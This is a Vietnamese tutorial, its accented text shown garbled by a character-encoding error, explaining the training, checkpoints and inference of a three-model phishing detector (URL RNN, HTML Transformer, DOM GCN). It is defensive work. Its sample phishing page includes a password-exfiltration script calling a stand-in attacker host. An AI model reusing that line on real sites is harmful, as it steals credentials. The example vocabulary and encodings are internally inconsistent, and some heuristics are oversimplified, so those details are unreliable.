# üéì T·ª´ Training ƒê·∫øn Inference: Gi·∫£i Th√≠ch Chi Ti·∫øt

## üìä **T·ªïng Quan Quy Tr√¨nh**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                    TRAINING PHASE (Offline)                     ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1. Chu·∫©n b·ªã d·ªØ li·ªáu (URL, HTML, DOM)                           ‚îÇ
‚îÇ 2. X√¢y d·ª±ng m√¥ h√¨nh neural network                             ‚îÇ
‚îÇ 3. Training tr√™n GPU (h√†ng gi·ªù/ng√†y)                           ‚îÇ
‚îÇ 4. L∆∞u checkpoint: weights + biases + metadata                 ‚îÇ
‚îÇ 5. L∆∞u artifacts: vocab, thresholds, evaluation metrics        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                              ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ          CHECKPOINT FILES (Nh·ªØng g√¨ ƒë∆∞·ª£c l∆∞u trong CKPT/)       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ‚úì rnn_best_ema.pt                  ‚Üí Weights c·ªßa RNN model      ‚îÇ
‚îÇ ‚úì transformer_byte_best.pt         ‚Üí Weights c·ªßa Transformer   ‚îÇ
‚îÇ ‚úì gnn_best.pt                      ‚Üí Weights c·ªßa GCN           ‚îÇ
‚îÇ ‚úì rnn_url_vocab.json               ‚Üí C√°ch encode URL           ‚îÇ
‚îÇ ‚úì gnn_tag_vocab.json               ‚Üí C√°ch encode DOM tags      ‚îÇ
‚îÇ ‚úì *_best_threshold.json            ‚Üí Decision boundary         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                              ‚Üì
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ             INFERENCE PHASE (Real-time, Online)                ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1. User nh·∫≠p URL/HTML                                          ‚îÇ
‚îÇ 2. Load checkpoint v√†o memory                                  ‚îÇ
‚îÇ 3. Preprocess input (encode, tokenize, padding)               ‚îÇ
‚îÇ 4. Forward pass qua neural network                            ‚îÇ
‚îÇ 5. Get output probability                                     ‚îÇ
‚îÇ 6. Compare v·ªõi threshold ‚Üí Phishing / Benign                 ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## üîç **Chi Ti·∫øt: M·ªói Model Ho·∫°t ƒê·ªông Nh∆∞ Th·∫ø N√†o**

### **1Ô∏è‚É£ RNN URL Model**

#### **Training Phase:**
```python
# TRAINING (L√∫c training - l√¢u, t·ªën c√¥ng)
# Input: URL strings (e.g., "https://evil.com/login")
# Output: Nh√£n (0=BENIGN, 1=PHISHING)

training_data = [
    ("https://paypal.com", 0),           # BENIGN
    ("https://pay-pal-verify.tk", 1),   # PHISHING
    ("https://amazon.com", 0),          # BENIGN
    ("https://amaz0n-verify.cf", 1),    # PHISHING
    ...
]

# Model h·ªçc pattern t·ª´ h√†ng tri·ªáu URLs
# N√≥ h·ªçc ƒë∆∞·ª£c r·∫±ng:
# - ".tk", ".ml", ".ga", ".cf" TLDs ‚Üí phishing
# - Hyphens ("-") trong domain ‚Üí phishing
# - Free hosts (firebase.com) ‚Üí phishing
# - Typosquatting patterns ‚Üí phishing

# L∆∞u k·∫øt qu·∫£ training:
model.state_dict() ‚Üí rnn_best_ema.pt  (weights + biases)
vocab              ‚Üí rnn_url_vocab.json (character mapping)
threshold          ‚Üí rnn_best_threshold.json (cutoff point)
```

#### **Inference Phase (Real-time):**
```python
# INFERENCE (Khi user nh·∫≠p URL)

# Step 1: Load checkpoint
checkpoint = torch.load("rnn_best_ema.pt")      # Weights
vocab = json.load("rnn_url_vocab.json")         # Encoding
threshold = json.load("rnn_best_threshold.json") # Cutoff

# Step 2: Kh·ªüi t·∫°o model v·ªõi c·∫•u tr√∫c t∆∞∆°ng t·ª±
model = GRUUrl(
    vocab_size=87,      # T·ª´ vocab size
    emb_dim=64,
    hidden_dim=128,
    num_layers=1,
    bidir=True
)

# Step 3: Load weights t·ª´ checkpoint
model.load_state_dict(checkpoint)  # ‚Üê Copy learned weights v√†o model
model.eval()                        # ‚Üê Set to inference mode

# Step 4: Preprocess input URL
input_url = "https://suspicious-site.tk/login"
encoded = encode_url(input_url, vocab, max_len=256)
# "https://suspicious-site.tk/login"
#  ‚Üì‚Üì‚Üì‚Üì‚Üì (m·ªói k√Ω t·ª± ‚Üí number t·ª´ vocab)
# [54, 23, 12, 45, 23, 12, 45, ...]

# Step 5: Forward pass
with torch.no_grad():  # ‚Üê Kh√¥ng c·∫ßn gradients (ch·ªâ inference)
    logits = model(torch.tensor(encoded))
    # Output t·ª´ model: [0.2, 3.5]
    # logits[0] = score cho BENIGN
    # logits[1] = score cho PHISHING
    
    probs = softmax(logits)
    # probs[0] = 0.05  (5% BENIGN)
    # probs[1] = 0.95  (95% PHISHING)
    
    p_phishing = probs[1].item()  # 0.95

# Step 6: Decision
if p_phishing >= threshold (0.5):
    verdict = "PHISHING" ‚úì
else:
    verdict = "BENIGN"
```

**V√≠ d·ª• c·ª• th·ªÉ:**
```
INPUT: "https://paypal-verify.tk"
       ‚Üì (encode qua vocab)
TENSOR: [54, 23, 12, 45, ..., 256, 256]  (256 = padding)
        ‚Üì (forward pass)
LOGITS: [0.1, 2.8]
        ‚Üì (softmax)
PROBS:  [0.05, 0.95]
        ‚Üì (compare v·ªõi threshold 0.5)
OUTPUT: 0.95 > 0.5 ‚Üí "PHISHING" ‚úÖ
```

---

### **2Ô∏è‚É£ Transformer HTML Model**

#### **Training Phase:**
```python
# Input: HTML content
html_benign = """
<html>
  <head><title>PayPal Login</title></head>
  <body>
    <form action="/login">
      <input type="email" name="email">
      <input type="password" name="password">
    </form>
  </body>
</html>
"""

html_phishing = """
<html>
  <body>
    <form action="http://attacker.com/steal">
      <input type="hidden" name="secret">
      <input type="password" name="password">
      <script>fetch('https://attacker.com?pwd='+pwd)</script>
    </form>
  </body>
</html>
"""

# Model h·ªçc patterns nh∆∞:
# - Multiple forms ‚Üí phishing
# - Hidden fields ‚Üí phishing
# - JavaScript logging ‚Üí phishing
# - External form action ‚Üí phishing
```

#### **Inference Phase:**
```python
# Step 1: Load checkpoint
checkpoint = torch.load("transformer_byte_best.pt")
# BYTE-level encoding (0-255 ascii codes)

# Step 2: Kh·ªüi t·∫°o model
model = ByteTransformer(
    vocab_size=259,  # 256 bytes + 3 special tokens
    d_model=256,
    n_head=8,
    n_layers=6
)
model.load_state_dict(checkpoint)
model.eval()

# Step 3: Preprocess HTML
html = fetch_html(url)  # Fetch t·ª´ server
encoded = encode_html_bytes(html)
# "<!doctype html><head>...</head>" 
#  ‚Üì (convert each char to byte)
# [60, 33, 100, 111, 99, 116, 121, 112, 101, ...]

# Step 4: Multi-window inference (v√¨ HTML d√†i)
# HTML c√≥ th·ªÉ 10,000+ bytes nh∆∞ng model max 1024
# ‚Üí Chia th√†nh windows, ch·∫°y model on each, average
p_phishing = infer_multi(html, max_windows=4)

OUTPUT: 0.72 ‚Üí "PHISHING" ‚úÖ
```

---

### **3Ô∏è‚É£ GCN DOM Model**

#### **Training Phase:**
```python
# Input: DOM tree structure
# V√≠ d·ª•:
# html
#  ‚îú‚îÄ‚îÄ head
#  ‚îÇ    ‚îî‚îÄ‚îÄ title
#  ‚îú‚îÄ‚îÄ body
#  ‚îÇ    ‚îú‚îÄ‚îÄ form (action="http://attacker.com")
#  ‚îÇ    ‚îÇ   ‚îú‚îÄ‚îÄ input (type=email)
#  ‚îÇ    ‚îÇ   ‚îî‚îÄ‚îÄ input (type=password)
#  ‚îÇ    ‚îî‚îÄ‚îÄ script

# Graph:
# Nodes: [html, head, title, body, form, input, input, script]
# Edges: [parent-child relationships]

# Model learns:
# - Form + password inputs ‚Üí phishing
# - External form action ‚Üí phishing
# - Script tags ‚Üí phishing
```

#### **Inference Phase:**
```python
# Step 1: Load checkpoint
checkpoint = torch.load("gnn_best.pt")

# Step 2: Build model
model = GCNClassifier(
    input_dim=64,      # Tag embedding
    hidden_dim=128,
    n_layers=2
)
model.load_state_dict(checkpoint)
model.eval()

# Step 3: Parse HTML ‚Üí DOM tree
from lxml import html as lxml_html
tree = lxml_html.fromstring(html_content)

# Step 4: Extract DOM features
nodes = extract_dom_nodes(tree)
edges = extract_dom_edges(tree)
# nodes: ["html", "head", "body", "form", ...]
# edges: [(0,1), (0,2), (3,4), (3,5), ...]

# Step 5: Encode nodes
encoded_nodes = encode_dom_tags(nodes, tag_vocab)
# ["html", "form", "input"] ‚Üí [[12, 0, 0], [34, 0, 0], [45, 0, 0]]

# Step 6: Forward pass
with torch.no_grad():
    logits = model(
        node_features=encoded_nodes,
        edges=edges
    )
    probs = softmax(logits)
    p_phishing = probs[1].item()

OUTPUT: 0.58 ‚Üí "PHISHING" ‚úÖ
```

---

## üß† **Kh√°i Ni·ªám Ch√≠nh**

### **Checkpoint = "B·ªô n√£o" ƒë√£ qua training**

```
checkpoint .pt file = {
    "model weights":  [
        layer1: [[0.123, 0.456, ...], [0.789, ...]],
        layer2: [[0.234, 0.567, ...], [0.890, ...]],
        ...
    ],
    "model biases": [0.012, 0.034, ...],
    "other parameters": {...}
}
```

**V√≠ d·ª• analogy:**
- Training: B·∫°n h·ªçc ti·∫øng Anh trong 1 nƒÉm (h√†ng trƒÉm gi·ªù h·ªçc)
- Checkpoint: L∆∞u l·∫°i "ki·∫øn th·ª©c" v√†o ·ªï c·ª©ng (ch·ª©ng ch·ªâ, ghi ch√∫)
- Inference: B·∫°n ƒë·ªçc ti·∫øng Anh (nhanh, kh√¥ng c·∫ßn h·ªçc l·∫°i)

### **Vocab = T·ª´ ƒëi·ªÉn encoding**

```python
# URL Vocab v√≠ d·ª•
vocab = {
    'h': 1,
    't': 2,
    'p': 3,
    's': 4,
    ':': 5,
    '.': 6,
    't': 7,
    'k': 8,
    ...
}

# "https://paypal.tk"
#  ‚Üì (map qua vocab)
# [3, 2, 7, 4, 1, 6, 21, 22, 23, 6, 7, 8]
```

### **Threshold = Decision boundary**

```python
# Model output: probability (0.0 - 1.0)
# Threshold: cutoff point (th∆∞·ªùng 0.5)

prob = 0.85
threshold = 0.5

if prob >= threshold:
    verdict = "PHISHING"  ‚Üê confidence
else:
    verdict = "BENIGN"
```

---

## üîÑ **Quy Tr√¨nh To√†n B·ªô Trong Code**

```python
# FILE: backend/main.py

@app.post("/api/analyze_url_full")
async def analyze_url_full(request: AnalysisRequest):
    url = request.url
    
    # 1Ô∏è‚É£ RNN URL Model
    url_prob, url_label = url_model.infer(url)
    #                      ‚Üì
    #   1. encode_url(url, vocab) ‚Üí tensor
    #   2. model.forward(tensor) ‚Üí logits
    #   3. softmax(logits) ‚Üí probs
    #   4. compare probs[1] vs threshold
    
    # 2Ô∏è‚É£ Transformer HTML Model
    html = fetch_html(url)
    html_prob, html_label = html_model.infer_multi(html)
    #                       ‚Üì
    #   1. encode_html_bytes(html) ‚Üí tensor
    #   2. model.forward(tensor) ‚Üí logits
    #   3. average across windows
    #   4. softmax(logits) ‚Üí probs
    
    # 3Ô∏è‚É£ GCN DOM Model
    dom_record = parse_dom(html)
    dom_prob, dom_label = dom_model.infer(dom_record)
    #                     ‚Üì
    #   1. parse_html_to_tree(html) ‚Üí graph
    #   2. encode_dom_tags(graph) ‚Üí tensor
    #   3. model.forward(graph) ‚Üí logits
    #   4. softmax(logits) ‚Üí probs
    
    # 4Ô∏è‚É£ Ensemble
    ensemble_prob = weighted_ensemble([
        (url_prob, 0.60),    # RNN weight 60%
        (html_prob, 0.20),   # Transformer weight 20%
        (dom_prob, 0.20)     # GCN weight 20%
    ])
    
    return {
        "url_model": {..., "probability": url_prob},
        "html_model": {..., "probability": html_prob},
        "dom_model": {..., "probability": dom_prob},
        "ensemble": {..., "probability": ensemble_prob}
    }
```

---

## üìà **Performance Breakdown**

| Giai ƒêo·∫°n | Th·ªùi Gian | CPU/GPU | Chi Ph√≠ |
|----------|-----------|---------|--------|
| **Training** | H√†ng gi·ªù/ng√†y | GPU (b·∫Øt bu·ªôc) | Cao |
| **Save Checkpoint** | < 1 gi√¢y | CPU/Disk | Th·∫•p |
| **Load Checkpoint** | ~ 0.5 gi√¢y | CPU (memory) | Th·∫•p |
| **Inference (1 URL)** | 50-200ms | CPU/GPU | Th·∫•p |
| **Inference (batch 100)** | 2-5 gi√¢y | CPU/GPU | Th·∫•p |

---

## üéØ **T√≥m T·∫Øt**

1. **Training** (offline, l√¢u):
   - D√πng GPU, h√†ng tri·ªáu d·ªØ li·ªáu
   - L∆∞u weights ‚Üí `.pt` checkpoint

2. **Checkpoint** (file nh·ªè, tƒ©nh):
   - Ch·ª©a learned knowledge
   - C√≥ th·ªÉ copy, backup, deploy

3. **Inference** (online, nhanh):
   - Load checkpoint v√†o memory
   - Preprocess user input
   - Forward pass ‚Üí prediction
   - Return result

4. **M·ªôt checkpoint = M·ªôt m√¥ h√¨nh ho√†n ch·ªânh**
   - Kh√¥ng c·∫ßn d·ªØ li·ªáu training
   - Kh√¥ng c·∫ßn training l·∫°i
   - Ch·ªâ c·∫ßn 1 d√≤ng code: `model.load_state_dict(checkpoint)`

---

## üöÄ **V√≠ D·ª• Th·ª±c T·∫ø**

```python
# User nh·∫≠p URL v√†o frontend
input_url = "https://verify-paypal-account.tk/login"

# Backend nh·∫≠n request
@app.post("/api/analyze_url_full")
async def analyze(request: AnalysisRequest):
    
    # Model 1: RNN
    # "verify-paypal-account.tk" ‚Üí weights h·ªçc t·ª´ 200K URLs
    #  - .tk TLD? ‚Üí +0.3 phishing score
    #  - hyphen? ‚Üí +0.2 phishing score
    #  - "paypal" typo? ‚Üí +0.25 phishing score
    #  - total = 0.95 probability
    url_prob = 0.95
    
    # Model 2: Transformer
    # HTML content ‚Üí check for forms, scripts, etc
    # K·∫øt qu·∫£: 0.72
    html_prob = 0.72
    
    # Model 3: GCN
    # DOM tree ‚Üí check for suspicious structure
    # K·∫øt qu·∫£: 0.68
    dom_prob = 0.68
    
    # Ensemble (weighted)
    # 0.95*0.6 + 0.72*0.2 + 0.68*0.2 = 0.83
    ensemble_prob = 0.83
    
    return {
        "ensemble": {
            "label": "PHISHING",
            "probability": 0.83
        }
    }
```

---

## ‚ùì **C√¢u H·ªèi Th∆∞·ªùng G·∫∑p**

### Q: T·∫°i sao checkpoint nh·ªè nh∆∞ng c√≥ th·ªÉ ƒë√°nh gi√° h√†ng tri·ªáu URLs?

**A:** Checkpoint ch·ª©a "pattern knowledge". Model h·ªçc c√°ch nh·∫≠n d·∫°ng patterns (typosquatting, phishing indicators), kh√¥ng c·∫ßn l∆∞u to√†n b·ªô training data.

### Q: N·∫øu load m·ªôt checkpoint sai c√≥ sao kh√¥ng?

**A:** K·∫øt qu·∫£ s·∫Ω sai. Nh∆∞ng checkpoint ƒë∆∞·ª£c checksummed, v√† code check model architecture tr∆∞·ªõc load.

### Q: C√≥ th·ªÉ inference m√† kh√¥ng load checkpoint?

**A:** Kh√¥ng, c·∫ßn checkpoint ƒë·ªÉ c√≥ weights. Model m·ªõi s·∫Ω random weights ‚Üí d·ª± ƒëo√°n ng·∫´u nhi√™n.

### Q: Checkpoint c√≥ ph·ª• thu·ªôc v√†o OS kh√¥ng?

**A:** Kh√¥ng, PyTorch checkpoints portable across OS (Windows/Linux/Mac).

